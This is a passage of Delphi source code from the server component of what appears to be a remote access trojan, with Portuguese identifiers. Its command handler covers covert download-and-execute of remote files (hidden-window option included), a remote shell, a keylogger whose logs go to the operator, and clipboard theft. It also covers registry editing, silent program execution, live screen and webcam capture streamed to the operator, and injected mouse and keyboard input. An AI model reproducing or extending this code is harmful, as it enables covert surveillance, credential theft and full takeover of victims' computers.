    TempStr2 := Copy(Comando, 1, Pos('|', Comando) - 1);

    if InstallService(pchar(TempStr), pchar(TempStr1), TempStr2) = true then
    begin
      _EnviarStream(ClientSocket, LISTARSERVICOS + '|' +
                                 INSTALARSERVICO + '|' +
                                 'Y|' +
                                 TempStr + '|');
    end else
    begin
      _EnviarStream(ClientSocket, LISTARSERVICOS + '|' +
                                 INSTALARSERVICO + '|' +
                                 'N|' +
                                 TempStr + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARJANELAS then
  begin
    TempStr2 := '';
    TempStr := WindowsList;
    while TempStr <> '' do
    begin
      TempStr1 := copy(TempStr, 1, pos('|', TempStr) - 1);
      delete(TempStr, 1, pos('|', TempStr));
      TempInt := StrToInt(copy(TempStr, 1, pos('|', TempStr) - 1));
      delete(TempStr, 1, pos('|', TempStr));
      TempStr2 := TempStr2 + TempStr1 + '|' + inttostr(TempInt) + '|' + GetProcessNameFromWnd(TempInt) + '|';
    end;

    if TempStr2 <> '' then
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               LISTADEJANELASPRONTA + '|' +
                               TempStr2) else
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               LISTADEJANELASPRONTA + '|' +
                               'XXX');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_FECHAR then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    FecharJanela(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_FECHAR + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_MAX then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    MaximizarJanela(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_MAX + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_MIN then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    MinimizarJanela(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_MIN + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_MOSTRAR then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    MostrarJanela(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_MOSTRAR + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_OCULTAR then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    OcultarJanela(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_OCULTAR + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_MIN_TODAS then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    MinimizarTodas;
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               WINDOWS_MIN_TODAS + '|' +
                               inttostr(TempInt) + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WINDOWS_CAPTION then
  begin
    Delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));
    if SetWindowText(strtoint(tempstr) ,PChar(copy(Comando, 1, pos('|', Comando) - 1))) = true then
    begin
      _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                                 WINDOWS_CAPTION + '|' +
                                 tempstr + '|' +
                                 copy(Comando, 1, pos('|', Comando) - 1) + '|');
    end else
    begin
      _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                                 WINDOWS_CAPTION + '|' +
                                 tempstr + '|' +
                                 'N|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DISABLE_CLOSE then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    DesabilitarClose(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               DISABLE_CLOSE + '|' +
                               inttostr(TempInt) + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = ENABLE_CLOSE then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
    HabilitarClose(TempInt);
    _EnviarStream(ClientSocket, LISTARJANELAS + '|' +
                               ENABLE_CLOSE + '|' +
                               inttostr(TempInt) + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARPROGRAMASINSTALADOS then
  begin
    tempstr := ListarApp('HKEY_LOCAL_MACHINE\' + UNINST_PATH);
    _EnviarStream(ClientSocket, LISTARPROGRAMASINSTALADOS + '|' +
                               LISTADEPROGRAMASINSTALADOSPRONTA + '|' +
                               TempStr + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESINSTALARPROGRAMA then
  begin
    delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    //myShellExecute(0, 'open', pchar(tempstr), nil, nil, SW_HIDE);
    winexec(pchar(tempstr), sw_hide);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARPORTAS then
  begin
    CarregarDllActivePort;

    TempStr := CriarLista(false);
    //LiberarDllActivePort;
    _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                               LISTADEPORTASPRONTA + '|' +
                               TempStr + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARPORTASDNS then
  begin
    CarregarDllActivePort;
    TempStr := CriarLista(true);
    //LiberarDllActivePort;
    _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                               LISTADEPORTASPRONTA + '|' +
                               TempStr + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = FINALIZARCONEXAO then
  begin
    CarregarDllActivePort;

    delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);

    delete(Comando, 1, pos('|', Comando));
    tempstr1 := copy(Comando, 1, pos('|', Comando) - 1);

    delete(Comando, 1, pos('|', Comando));
    tempstr2 := copy(Comando, 1, pos('|', Comando) - 1);

    delete(Comando, 1, pos('|', Comando));
    tempstr3 := copy(Comando, 1, pos('|', Comando) - 1);

    if CloseTcpConnect(tempstr, tempstr2, strtoint(tempstr1), strtoint(tempstr3)) = true then
    begin
      //LiberarDllActivePort;
      _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                                 FINALIZARCONEXAO + '|' +
                                 tempstr + '|' +
                                 tempstr2 + '|' +
                                 'TRUE' + '|');
    end else
    begin
      //LiberarDllActivePort;
      _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                                 FINALIZARCONEXAO + '|' +
                                 tempstr + '|' +
                                 tempstr2 + '|' +
                                 'FALSE' + '|');
    end;
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = FINALIZARPROCESSOPORTAS then
  begin
    delete(comando, 1, pos('|', Comando));
    try
      TempInt := StrToInt(copy(Comando, 1, pos('|', Comando) - 1));
      except
    end;
    if TerminarProceso(TempInt) = true then
    _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                               FINALIZARPROCESSOPORTAS + '|' +
                               'Y|' +
                               inttostr(TempInt) + '|') else
    _EnviarStream(ClientSocket, LISTARPORTAS + '|' +
                               FINALIZARPROCESSOPORTAS + '|' +
                               'N|' +
                               inttostr(TempInt) + '|');
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTDEVICES then
  begin
    TempStr := FillDeviceList(DeviceClassesCount, DevicesCount);
    _EnviarStream(ClientSocket, LISTDEVICES + '|' +
                               LISTADEDISPOSITIVOSPRONTA + '|' +
                               inttostr(DeviceClassesCount) + '|' +
                               inttostr(DevicesCount) + '|' +
                               TempStr);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTEXTRADEVICES then
  begin
    delete(Comando, 1, pos('|', Comando));
    TempStr := ShowDeviceAdvancedInfo(strtoint(copy(Comando, 1, pos('|', Comando) - 1)));
    _EnviarStream(ClientSocket, LISTEXTRADEVICES + '|' +
                               LISTADEDISPOSITIVOSEXTRASPRONTA + '|' +
                               TempStr);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = CONFIGURACOESDOSERVER then
  begin
    TempStr := GerarRelatorioConfig;
    _EnviarStream(ClientSocket, CONFIGURACOESDOSERVER + '|' +
                               CONFIGURACOESDOSERVER + '|' +
                               TempStr);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = EXECUTARCOMANDOS then
  begin
    delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    tempstr1 := '';
    if pos(' ', tempstr) > 1 then
    begin
      tempstr1 := tempstr;
      tempstr := copy(tempstr1, 1, pos(' ', tempstr1) - 1);
      delete(tempstr1, 1, pos(' ', tempstr1));
    end;
    ExecuteCommand(tempstr, tempstr1, sw_normal);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = OPENWEB then
  begin
    Delete(Comando, 1, pos('|', Comando));
    tempstr := copy(Comando, 1, pos('|', Comando) - 1);
    try
      Myshellexecute(0, 'open', pchar(getdefaultbrowser), pchar(tempstr), '', SW_SHOWMAXIMIZED);
      except
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DOWNEXEC then
  begin
    Delete(Comando, 1, pos('|', Comando));

    tempstr3 := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    tempstr1 := copy(Comando, 1, pos('|', Comando) - 1);

    tempstr2 := mytempfolder + extractfilename(tempstr1);
    try
      MyURLDownloadToFile(nil, pchar(tempstr1), pchar(tempstr2), 0, nil);
      if tempstr3 = 'Y' then Myshellexecute(0, 'open', pchar(tempstr2), nil, pchar(mytempfolder), sw_hide) else
      Myshellexecute(0, 'open', pchar(tempstr2), nil, pchar(mytempfolder), sw_normal);
      except
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = OBTERCLIPBOARD then
  begin
    if GetClipboardText(0, TempStr) = true then
    begin
      _EnviarStream(ClientSocket, OBTERCLIPBOARD + '|' +
                                 OBTERCLIPBOARD + '|' +
                                 TempStr);
    end else
    if GetClipboardFiles(TempStr) = true then
    begin
      _EnviarStream(ClientSocket, OBTERCLIPBOARD + '|' +
                                 OBTERCLIPBOARDFILES + '|' +
                                 TempStr);
    end else
      _EnviarStream(ClientSocket, OBTERCLIPBOARD + '|' +
                                 OBTERCLIPBOARD + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DEFINIRCLIPBOARD then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
      finally
      CloseClipboard;
    end;

    Delete(Comando, 1, pos('|', Comando));
    SetClipboardText(Comando);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LIMPARCLIPBOARD then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
      finally
      CloseClipboard;
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SHELLATIVAR then
  begin
    if ShellThreadID <> 0 then
    begin
      ShellGetComando('exit');
      sleep(100);
      ShellGetComando('');
      //closethread(ShellThreadID);
      ShellThreadID := 0;
    end;
    ShellGetVariaveis(RandomStringClient, ClientSocket.RemoteAddress, senha, ClientSocket.RemotePort);
    ShellThreadID := CommandThreadId;
    ShellThread;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SHELLDESATIVAR then
  begin
    if ShellThreadID <> 0 then
    begin
      ShellGetComando('exit');
      sleep(100);
      ShellGetComando('');
      //closethread(ShellThreadID);
      ShellThreadID := 0;
      _EnviarStream(ClientSocket, SHELLRESPOSTA + '|' +
                                 SHELLDESATIVAR + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = SHELLRESPOSTA then
  begin
    Delete(Comando, 1, pos('|', Comando));
    TempStr := copy(Comando, 1, pos('|', Comando) - 1);
    ShellGetComando(TempStr);
    if upperstring(TempStr) = 'EXIT' then
    begin
      sleep(100);
      ShellGetComando('');
      _EnviarStream(ClientSocket, SHELLRESPOSTA + '|' +
                                 SHELLDESATIVAR + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = LISTARCHAVES then
  begin
    if ListarChavesRegistro <> 0 then closethread(ListarChavesRegistro);
    ListarChavesRegistro := CommandThreadId;

    Delete(Comando, 1, pos('|', Comando));

    NumArrayRegistro := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    Comando := copy(Comando, 1, pos('|', Comando) - 1);

    TempStr := ListarClaves(Comando);
    ToSend := REGISTRO + '|' + LISTARCHAVES + '|' + NumArrayRegistro + '|' + TempStr;

    _EnviarStream(ClientSocket, ToSend);

    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = UnitComandos.LISTARVALORES then
  begin
    if ListarValoresRegistro <> 0 then closethread(ListarValoresRegistro);
    ListarValoresRegistro := CommandThreadId;

    Delete(Comando, 1, pos('|', Comando));
    Comando := copy(Comando, 1, pos('|', Comando) - 1);
    ToSend := REGISTRO + '|' + UnitComandos.LISTARVALORES + '|' + ListarValores(Comando);
    _EnviarStream(ClientSocket, ToSend);

    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = RENAMEKEY then
  begin
    Delete(Comando, 1, pos('|', Comando));

    NumArrayRegistro := copy(Comando, 1, pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    if RenameRegistryItem(TempStr, TempStr1) = true then
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + RENAMEKEY + '|' + NumArrayRegistro + '|' + '272' + '|"' + TempStr + ' <---> ' + TempStr1 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end else
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + RENAMEKEY + '|' + NumArrayRegistro + '|' + '273' + '|"' + TempStr + ' <---> ' + TempStr1 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = NOVONOMEVALOR then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    TempStr2 := Copy(Comando, 1, Pos('|', Comando) - 1);

    if RenombrarClave(PChar(TempStr), PChar(TempStr1), PChar(TempStr2)) then
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '272' + '|"' + TempStr1 + ' <---> ' + TempStr2 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end
    else
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '273' + '|"' + TempStr1 + ' <---> ' + TempStr2 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = APAGARREGISTRO then
  begin
    Delete(Comando, 1, pos('|', Comando));

    Comando := copy(Comando, 1, pos('|', Comando) - 1);

    if BorraClave(Comando) then
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '274' + '|"' + Comando + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end
    else
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '275' + '|"' + Comando + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else
    
  if copy(Comando, 1, pos('|', Comando) - 1) = NOVACHAVE then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr :=  Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);
    Tempstr4 := tempstr + tempstr1;

    if AniadirClave(pchar(Tempstr4), '', 'clave') then
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '276' + '|"' + Tempstr4 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end
    else
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '277' + '|"' + Tempstr4 + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = ADICIONARVALOR then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, Pos('|', Comando));

    if AniadirClave(TempStr, Copy(Comando, 1, Pos('|', Comando) - 1), TempStr1) then
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '278' + '|"' + Copy(Comando, 1, Pos('|', Comando) - 1) + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end
    else
    begin
      sleep(5);
      ToSend := REGISTRO + '|' + REGISTRO + '|' + '279' + '|"' + Copy(Comando, 1, Pos('|', Comando) - 1) + '"|';
      _EnviarStream(ClientSocket, ToSend);
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGER then
  begin
    if KeyloggerThread <> 0 then
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERATIVAR + '|') else
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERDESATIVAR + '|');
    closethread(CommandThreadId);
  end else


  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGERATIVAR then
  begin
    if KeyloggerThread <> 0 then
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERATIVAR + '|') else
    begin
      KeyloggerThread := StartThread(@startkeylogger);
      _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERATIVAR + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGERDESATIVAR then
  begin
    if KeyloggerThread = 0 then
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERDESATIVAR + '|') else
    begin
      CloseThread(KeyloggerThread);
      KeyloggerThread := 0;
      _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERDESATIVAR + '|');
    end;
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGERGETLOG then
  begin
    if (MyGetFileSize(LogsFile) > 0) then
    begin
      TempStr := LogsFile + '.tmp';
      copyfile(pchar(LogsFile), pchar(TempStr), false);
      TempInt := MyGetFileSize(LogsFile);
      EnviarArquivo(ClientSocket, KEYLOGGER + '|' + KEYLOGGERGETLOG + '|', TempStr, TempInt, 0, false);
      Mydeletefile(TempStr);
      while true do sleep(high(integer));
    end else
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERVAZIO + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGERERASELOG then
  begin
    MyDeleteFile(LogsFile);
    DecryptedLog := '';
    LoggedKeys := '';
    _EnviarStream(ClientSocket, KEYLOGGER + '|' + KEYLOGGER + '|' + KEYLOGGERVAZIO + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYLOGGERSEARCH then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);
    Delete(Comando, 1, pos('|', Comando));

    if pos(TempStr, DecryptedLog) > 0 then _EnviarStream(ClientSocket, KEYLOGGERSEARCHOK + '|');
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESKTOP then
  begin
    DC1 := GetDC(GetDesktopWindow);
    EixoX := GetDeviceCaps(DC1, HORZRES);
    EixoY := GetDeviceCaps(DC1, VERTRES);
    ReleaseDC(GetDesktopWindow, DC1);

    _EnviarStream(ClientSocket, DESKTOP + '|' + DESKTOPRATIO + '|' + inttostr(EixoX) + '|' + inttostr(EixoY) + '|', true);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESKTOPPREVIEW then
  begin
    Delete(Comando, 1, pos('|', Comando));

    TempStr := Copy(Comando, 1, Pos('|', Comando) - 1);  // qualidade
    Delete(Comando, 1, Pos('|', Comando));

    TempStr1 := Copy(Comando, 1, Pos('|', Comando) - 1); // eixo X
    Delete(Comando, 1, Pos('|', Comando));

    TempStr2 := Copy(Comando, 1, Pos('|', Comando) - 1); // eixo Y
    Delete(Comando, 1, Pos('|', Comando));

    ToSend := GetDesktopImage(strtoint(TempStr), strtoint(TempStr1), strtoint(TempStr2));
    _EnviarStream(ClientSocket, DESKTOP + '|' + DESKTOPPREVIEW + '|' + ToSend);
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESKTOPGETBUFFER then
  begin
    //if DesktopCS <> nil then DesktopCS.Disconnect;

    Delete(Comando, 1, pos('|', Comando));

    DesktopQuality := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    EixoXDesktop := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    EixoYDesktop := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    DesktopIntervalo := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    DesktopCS := TClientSocket.Create;

    Tentativa := 0;
    while (DesktopCS.Connected = false) and (Tentativa < 10) do
    begin
      DesktopCS.Connect(ClientSocket.RemoteAddress, ClientSocket.RemotePort);
      sleep(10);
      inc(Tentativa);
    end;

    EnviarTexto(DesktopCS, senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + DESKTOP + '|' + DESKTOPGETBUFFER + '|');
    sleep(1000);
    while (DesktopCS.Connected = true) and (ClientSocket.Connected = true) do
    begin
      if DesktopIntervalo <> 0 then sleep(DesktopIntervalo * 1000) else sleep(100);
      TempStr := GetDesktopImage(DesktopQuality, EixoXDesktop, EixoYDesktop);
      EnviarTexto(DesktopCS, TempStr);
      processmessages;
    end;
    sleep(1000);
    try
      DesktopCS.Destroy;
      except
    end;
    while true do processmessages;
    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = DESKTOPSETTINGS then
  begin
    Delete(Comando, 1, pos('|', Comando));

    DesktopQuality := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    EixoXDesktop := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    EixoYDesktop := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    DesktopIntervalo := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    CloseHandle(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = MOUSEPOSITION then
  begin
    Delete(Comando, 1, pos('|', Comando));

    Point.X := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    Point.Y := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    MouseButton := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    ClientToScreen(strtoint(copy(Comando, 1, pos('|', Comando) - 1)), Point);
    Delete(Comando, 1, pos('|', Comando));

    DC := GetDC(GetDesktopWindow);
    Point.X := Round(Point.X * (65535 / GetDeviceCaps(DC, 8)));
    Point.Y := Round(Point.Y * (65535 / GetDeviceCaps(DC, 10)));
    ReleaseDC(GetDesktopWindow, DC);

    mouse_event(MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE, Point.X, Point.Y, 0, 0);
    mouse_event(MouseButton, 0, 0, 0, 0);

    Point.X := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    Point.Y := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    MouseButton := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    delay := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    sleep(delay);

    DC := GetDC(GetDesktopWindow);
    Point.X := Round(Point.X * (65535 / GetDeviceCaps(DC, 8)));
    Point.Y := Round(Point.Y * (65535 / GetDeviceCaps(DC, 10)));
    ReleaseDC(GetDesktopWindow, DC);

    mouse_event(MOUSEEVENTF_MOVE or MOUSEEVENTF_ABSOLUTE, Point.X, Point.Y, 0, 0);
    mouse_event(MouseButton, 0, 0, 0, 0);
    sleep(1000);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = KEYBOARDKEY then
  begin
    delete(Comando, 1, pos('|', Comando));
    sendkeys(Comando);
    closethread(CommandThreadId);
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WEBCAMSETTINGS then
  begin
    Delete(Comando, 1, pos('|', Comando));

    WebcamQuality := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    WebcamIntervalo := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    CloseHandle(CommandThreadId);
  end else

  if (copy(Comando, 1, pos('|', Comando) - 1) = WEBCAMGETBUFFER) or
     (copy(Comando, 1, pos('|', Comando) - 1) = WEBCAM) then
  begin
    if copy(Comando, 1, pos('|', Comando) - 1) = WEBCAM then
    begin
      if WebcamCS <> nil then WebcamCS.Disconnect(erro21);
      if FCapHandle <> 0 then
      begin
        DestroyCapture;
        FecharJanela(WebcamWindow);
      end;

      CommandThreadId := StartThread(@initCapture);
      sleep(1000);
      if DriverEmUso = true then _EnviarStream(ClientSocket, WEBCAM + '|' + WEBCAMINACTIVE + '|') else
      _EnviarStream(ClientSocket, WEBCAM + '|' + WEBCAMACTIVE + '|', true);
      exit;
    end;

    Delete(Comando, 1, pos('|', Comando));

    WebcamQuality := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    WebcamIntervalo := strtoint(copy(Comando, 1, pos('|', Comando) - 1));
    Delete(Comando, 1, pos('|', Comando));

    WebcamCS := TClientSocket.Create;

    Tentativa := 0;
    while (WebcamCS.Connected = false) and (Tentativa < 10) do
    begin
      WebcamCS.Connect(ClientSocket.RemoteAddress, ClientSocket.RemotePort);
      sleep(10);
      inc(Tentativa);
    end;

    EnviarTexto(WebcamCS, senha + '|Y|' + RESPOSTA + '|' + RandomStringClient + '|' + WEBCAM + '|' + WEBCAMGETBUFFER + '|');
    sleep(1000);

    while (WebcamCS.Connected = true) and (ClientSocket.Connected = true) and (FCapHandle <> 0) do
    begin
      if WebcamIntervalo <> 0 then sleep(WebcamIntervalo * 1000) else sleep(100);
      TempStr := MyTempFolder + inttostr(gettickcount) + '.bmp';

      if FCapHandle <> 0 then
      if (SendMessage(FCapHandle, WM_CAP_GRAB_FRAME,0,0) <> 0) and
         (SendMessage(FCapHandle, WM_CAP_SAVEDIB, wparam(0), lparam(PChar(TempStr))) <> 0) then
      begin
        SendMessage(FCapHandle, WM_CAP_SET_PREVIEW, -1, 0);

        if fileexists(TempStr) then
        EnviarTexto(WebcamCS, BMPFiletoJPGString(TempStr, WebcamQuality));
        MyDeleteFile(TempStr);
      end;
      processmessages;
    end;
    sleep(1000);
    if FCapHandle <> 0 then
    begin
      DestroyCapture;
      FecharJanela(WebcamWindow);
    end;
    try
      WebcamCS.Destroy;
      except
    end;
    while true do processmessages;
  end else

  if copy(Comando, 1, pos('|', Comando) - 1) = WEBCAMINACTIVE then
  begin
    if FCapHandle <> 0 then
    begin
      DestroyCapture;
